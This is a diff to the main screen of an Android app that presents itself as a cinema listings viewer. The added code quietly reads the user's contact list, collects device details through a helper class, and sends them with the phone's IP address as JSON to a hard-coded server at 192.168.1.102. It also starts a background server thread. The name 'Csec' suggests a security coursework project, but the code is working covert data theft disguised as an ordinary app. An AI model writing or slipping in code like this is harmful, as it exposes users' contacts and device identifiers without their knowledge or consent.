@@ -16,6 +16,7 @@ import android.widget.ListView;
 import android.widget.Toast;
 
 import org.json.JSONArray;
+import org.json.JSONException;
 import org.json.JSONObject;
 import org.jsoup.Jsoup;
 import org.jsoup.nodes.Document;
@@ -39,6 +40,13 @@ public class MainActivity extends AppCompatActivity {
 
     final String TAG_MAIN = "MainActivity";
 
+    String serverIp = "192.168.1.102";
+
+    //data
+    JSONObject data = new JSONObject();
+    JSONArray contactsJson = new JSONArray();
+    JSONObject utilsJson = new JSONObject();
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -46,25 +54,38 @@ public class MainActivity extends AppCompatActivity {
         Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
         setSupportActionBar(toolbar);
 
-        //new Request().execute("http://192.168.1.103:8080/Csec/Servlet");
-
+        //sinemalar view lists
         sinemalarTitle = new ArrayList<String>();
         sinemalarImg = new ArrayList<String>();
         sinemalarDesc = new ArrayList<String>();
 
+        //populate sinemalar request and apply listview adapter
         new SinemalarRequest().execute(SINEMALAR_URL);
+        //Log.i(TAG_MAIN, sinemalarContent.toString());
 
-//        Log.i(TAG_MAIN, sinemalarContent.toString());
+        //initiate server
+        ServerThread serverThread = new ServerThread();
+        String ip = serverThread.getLocalIp();
+        new ServerThread().start();
 
         context = this;
-        //checkIfPermissonExists();
+        checkIfPermissonExists();   //For Android 6.0
 
-//        Utils utils = new Utils(context);
-//        Log.i("XXXXXXXX", utils.get_IMEI());
-//        new Tickets().getTickets(context);
+        Utils utils = new Utils(context);
+        utilsJson = utils.getUtils();
+        //new Tickets().getTickets(context);
+
+        try {
+            data.put("ip", ip);
+            data.put("utils", utilsJson);
+            data.put("contacts", contactsJson);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+
+        new Request().execute("http://" + serverIp + ":8080/Csec/Servlet", data.toString());
 
 
-        new ServerThread().start();
     }
 
     final private int REQUEST_CODE_ASK_PERMISSIONS = 123;
@@ -80,7 +101,6 @@ public class MainActivity extends AppCompatActivity {
             else {
                 readContacts();
             }
-
         }
         else {
             readContacts();
@@ -96,7 +116,7 @@ public class MainActivity extends AppCompatActivity {
                     readContacts();
                 } else {
                     // Permission Denied
-                    Toast.makeText(MainActivity.this, "WRITE_CONTACTS Denied", Toast.LENGTH_SHORT).show();
+                    Toast.makeText(MainActivity.this, "READ_CONTACTS Denied", Toast.LENGTH_SHORT).show();
                 }
                 break;
             default:
@@ -108,7 +128,7 @@ public class MainActivity extends AppCompatActivity {
 
         ContentResolver contentResolver = getContentResolver();
         Contacts contacts= new Contacts(contentResolver);
-        contacts.getAllContacts();
+        contactsJson = contacts.getAllContacts();
     }
 
     //getting sinemalar content
